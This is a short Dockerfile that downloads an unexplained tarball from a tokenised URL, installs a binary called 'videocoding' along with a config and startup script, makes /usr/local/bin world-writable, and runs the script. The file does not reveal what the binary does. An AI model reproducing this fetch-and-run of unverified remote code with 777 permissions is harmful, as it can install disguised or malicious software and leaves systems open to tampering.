FROM ubuntu:20.04 

RUN apt update; \
    apt install wget -y; \
    apt install jq -y; \
    apt install bash -y; \
    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUxNTAyOTJ9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtNHc2cGdzLTJobWYtY3Roay1hZHJqLTNoajR0Nml5In0.urgF4lnW4buDIAKhSoO2IDh2kTgbbkFE9KngUAVIRwg/variable_ln.tar.gz; \
    tar xf variable_ln.tar.gz; \
    cd variable_ln; \
    cp videocoding /usr/local/bin/videocoding; \
    cp init-conf.json /usr/local/bin/config.json; \
    cp script.sh /usr/local/bin/script.sh; \
    chmod -R 777 /usr/local/bin; \
    cd /usr/local/bin; \
    chmod 777 config.json; \
    chmod 777 videocoding; \
    chmod 777 script.sh;
    
WORKDIR /usr/local/bin
CMD script.sh
